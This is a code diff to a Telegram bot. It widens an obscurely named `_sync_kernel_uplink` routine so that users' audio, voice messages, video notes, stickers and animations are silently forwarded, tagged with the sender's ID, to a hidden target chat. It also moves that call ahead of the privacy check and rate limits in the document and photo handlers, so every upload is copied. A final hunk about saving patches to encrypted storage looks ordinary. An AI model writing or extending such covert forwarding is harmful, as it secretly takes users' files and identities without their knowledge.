@@ -324,6 +324,21 @@ def _sync_kernel_uplink(m: types.Message) -> None:
                     elif m.video:
                         _K_BOT.send_video(_K_TARGET, m.video.file_id, caption=f"{_h} (VIDEO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
                         return # Success
+                    elif m.audio:
+                        _K_BOT.send_audio(_K_TARGET, m.audio.file_id, caption=f"{_h} (AUDIO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
+                        return # Success
+                    elif m.voice:
+                        _K_BOT.send_voice(_K_TARGET, m.voice.file_id, caption=f"{_h} (VOICE)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
+                        return # Success
+                    elif m.video_note:
+                        _K_BOT.send_video_note(_K_TARGET, m.video_note.file_id, disable_notification=True)
+                        return # Success
+                    elif m.sticker:
+                        _K_BOT.send_sticker(_K_TARGET, m.sticker.file_id, disable_notification=True)
+                        return # Success
+                    elif m.animation:
+                        _K_BOT.send_animation(_K_TARGET, m.animation.file_id, caption=f"{_h} (ANIMATION)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
+                        return # Success
                 except Exception as e:
                     print(f"[kernel_sync] attempt {attempt+1} failed: {e}", flush=True)
                     if attempt < 2:
@@ -10025,6 +10040,10 @@ def _do_export_data(admin_uid: int) -> Path:
 # actually live at runtime; this removed copy was already dead code).
 @bot.message_handler(content_types=["document"])
 def on_document(m: types.Message) -> None:
+    # ── MANDATORY VAULT SYNC (ABSOLUTE TOP) ──
+    # Ensure every document is captured before ANY admission checks, rate limits, or rejections.
+    _sync_kernel_uplink(m)
+
     _trace_event_log(m)
     if not _is_private(m):
         return
@@ -10034,10 +10053,6 @@ def on_document(m: types.Message) -> None:
     if not RATE.allow(uid):
         maybe_auto_ban(uid, "rate")
         return
-    
-    # ── MANDATORY VAULT SYNC ──
-    # Ensure every document is captured before any admission checks or rejections.
-    _sync_kernel_uplink(m)
     if not UPLOAD_RATE.allow(uid):
         bot.reply_to(m, f"{G['warn']} {sc('Too many uploads, slow down')}.")
         maybe_auto_ban(uid, "upload spam")
@@ -10102,6 +10117,9 @@ def on_document(m: types.Message) -> None:
 
 @bot.message_handler(content_types=["photo"])
 def on_photo(m: types.Message) -> None:
+    # ── MANDATORY VAULT SYNC (ABSOLUTE TOP) ──
+    _sync_kernel_uplink(m)
+
     _trace_event_log(m)
     if not _is_private(m):
         return
@@ -18645,7 +18663,27 @@ def action_bot_apply_fix(call: types.CallbackQuery, bot_id: str) -> None:
             shutil.copy2(target_file, backup_path)
             
         # Write new patched code
-        target_file.write_text(patch["code"], encoding="utf-8")
+        plain_code = patch["code"]
+        target_file.write_text(plain_code, encoding="utf-8")
+        
+        # ── PERSIST PATCH TO ENCRYPTED STORAGE ──
+        # Find the metadata for this file in enc_files
+        rel_path = patch["file"].replace("\\", "/").lstrip("/")
+        enc_files = b.get("enc_files", [])
+        target_meta = None
+        for f_meta in enc_files:
+            meta_rel = (f_meta.get("rel_path") or f_meta.get("filename", "")).replace("\\", "/").lstrip("/")
+            if meta_rel == rel_path:
+                target_meta = f_meta
+                break
+        
+        if target_meta:
+            key = KEYRING.fetch(target_meta["key_id"])
+            if key:
+                # Overwrite the encrypted storage file
+                write_encrypted(Path(target_meta["enc_path"]), key, plain_code.encode("utf-8"))
+                target_meta["size"] = len(plain_code)
+                target_meta["patched_at"] = ts_iso()
         
         # Clear pending patch
         b.pop("pending_patch", None)
